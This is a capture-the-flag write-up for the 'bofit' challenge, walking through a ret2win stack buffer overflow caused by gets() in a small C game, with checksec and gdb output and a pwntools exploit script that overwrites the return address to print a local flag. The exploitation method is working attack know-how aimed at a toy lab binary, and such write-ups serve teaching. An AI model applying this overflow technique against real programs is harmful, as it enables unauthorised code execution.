### Binary Exploitation

### Source: DAWG_21

### Basic File Checks

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/bofit]
└─$ file bofit
bofit: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=599c2754819e660a71375162cc1cefb212ab8f16, for GNU/Linux 3.2.0, not stripped
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/bofit]
└─$ checksec bofit
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/bofit/bofit'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

We're working with a x64 binary and sweeeet no protection is enabled.

But sadly no form of shellcode will be done 😞 

Source code is given lets have a look at it

```
#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>

void win_game(){
	char buf[100];
	FILE* fptr = fopen("flag.txt", "r");
	fgets(buf, 100, fptr);
	printf("%s", buf);
}

int play_game(){
	char c;
	char input[20];
	int choice;
	bool correct = true;
	int score = 0;
	srand(time(0));
	while(correct){
		choice = rand() % 4;
		switch(choice){
			case 0:
				printf("BOF it!\n");
				c = getchar();
				if(c != 'B') correct = false;
				while((c = getchar()) != '\n' && c != EOF);
				break;

			case 1:
				printf("Pull it!\n");
				c = getchar();
				if(c != 'P') correct = false;
				while((c = getchar()) != '\n' && c != EOF);
				break;

			case 2:
				printf("Twist it!\n");
				c = getchar();
				if(c != 'T') correct = false;
				while((c = getchar()) != '\n' && c != EOF);
				break;

			case 3:
				printf("Shout it!\n");
				gets(input);
				if(strlen(input) < 10) correct = false;
				break;
		}
		score++;
	}
	return score;
}

void welcome(){
	char input;
	printf("Welcome to BOF it! The game featuring 4 hilarious commands to keep players on their toes\n");
	printf("You'll have a second to respond to a series of commands\n");
	printf("BOF it: Reply with a capital \'B\'\n");
	printf("Pull it: Reply with a capital \'P\'\n");
	printf("Twist it: Reply with a capital \'T\'\n");
	printf("Shout it: Reply with a string of at least 10 characters\n");
	printf("BOF it to start!\n");
	input = getchar();
	while(input != 'B'){
		printf("BOF it to start!\n");
		input = getchar();
	}
	while((input = getchar()) != '\n' && input != EOF);
}

int main(){
	int score = 0;
	welcome();
	score = play_game();
	printf("Congrats! Final score: %d\n", score);
	return 0;
}
```

Its pretty much of a game 

Here's what the games does 

```
 The game has four commands that the user must respond to within a second, and they are "BOF it!", "Pull it!", "Twist it!", and "Shout it!".
 The user must respond to each command according to the prompt, either by typing "B" for "BOF it!", "P" for "Pull it!", "T" for "Twist it!", or typing a string of at least 10 characters for "Shout it!".
 The game continues until the user makes a mistake in their response, at which point the final score is displayed, indicating the number of commands that were successfully completed.
 ```
 
 So after all the shakara (pride) the code does here's it vulnerability
 
 ```
 case 3:
				printf("Shout it!\n");
				gets(input);
				if(strlen(input) < 10) correct = false;
				break;
```

Using get is insecure here's why:
 
 ```
 The function "gets()" is used to read the user's input, and it does not check the size of the input before storing it in the "input" buffer, which has a fixed size of 20 characters. This allows a user to write more data to the buffer than it can hold, potentially overwriting adjacent memory, which can lead to unexpected behavior and can be used to compromise the security of the program
 ```
 
So with this we know that this is a ret2win bof challenge as the win_game function is called in the main function

And what the win_game does is to open the content of the flag and print it out

```
void win_game(){
	char buf[100];
	FILE* fptr = fopen("flag.txt", "r");
	fgets(buf, 100, fptr);
	printf("%s", buf);
}
```

Since i know what the code does, here's what i did:

I had to make the exploit script to eventually play the game and keep giving the expected value the programs needs till it reach the case where the vuln function lays

With that i can then make the rip (instruction pointer) call the win_game function

Here's how i got the win_game function `0x0000000000401256`

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/bofit]
└─$ gdb -q bofit        
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.11
Reading symbols from bofit...
(No debugging symbols found in bofit)
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010d0  puts@plt
0x00000000004010e0  strlen@plt
0x00000000004010f0  printf@plt
0x0000000000401100  srand@plt
0x0000000000401110  fgets@plt
0x0000000000401120  getchar@plt
0x0000000000401130  time@plt
0x0000000000401140  gets@plt
0x0000000000401150  fopen@plt
0x0000000000401160  rand@plt
0x0000000000401170  _start
0x00000000004011a0  _dl_relocate_static_pie
0x00000000004011b0  deregister_tm_clones
0x00000000004011e0  register_tm_clones
0x0000000000401220  __do_global_dtors_aux
0x0000000000401250  frame_dummy
0x0000000000401256  win_game
0x00000000004012a9  play_game
0x000000000040141a  welcome
0x00000000004014b6  main
0x0000000000401500  __libc_csu_init
0x0000000000401570  __libc_csu_fini
0x0000000000401578  _fini
gef➤
```

I used the cyclic method with gdb to determine my offset, then finished the exploit by adding the address of win_game in order to jump there when I deliberately trigger the return condition

Also it should be noted there appear to be no cases in which the function calls exit(), and it will return if you trigger the break on any of the cases by answering incorrectly

With this I used the cyclic method with gdb to determine my offset, then finished the exploit by adding the address of win_game in order to jump there when I deliberately trigger the return condition

Here's the exploit

```
from pwn import *

target = process(b'./bofit')

#pid = gdb.attach(target, "\nb *play_game+368\ncontinue")

print(target.recvuntil(b'BOF it to start!'))

target.sendline(b'B')

while True:
        current = target.recvuntil(b'it!')
        print(current)
        if b'BOF' in current:
                target.sendline(b'B')
        elif b'Pull' in current:
                target.sendline(b'P')
        elif b'Twist' in current:
                target.sendline(b'T')
        else:
                #payload = cyclic(200)
                padding = b'a' * 56
                payload = padding
                payload += p64(0x00401256)
                target.sendline(payload)
                break
print(target.recvuntil(b'it!'))
target.sendline(b'end') #basically i just want the game to end so rip will call win_game xD
target.interactive()
```

On running it

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/bofit]
└─$ python2 exploit.py
[+] Starting local process './bofit': pid 97102
Welcome to BOF it! The game featuring 4 hilarious commands to keep players on their toes
You'll have a second to respond to a series of commands
BOF it: Reply with a capital 'B'
Pull it: Reply with a capital 'P'
Twist it: Reply with a capital 'T'
Shout it: Reply with a string of at least 10 characters
BOF it to start!

BOF it!

Twist it!

BOF it!

Twist it!

BOF it!

Shout it!

Pull it!
[*] Switching to interactive mode

FLAG{Y0U_KN0W_PWN}
[*] Got EOF while reading in interactive
$
```

And we're done 

<br> <br> 
[Back To Home](../../index.md)
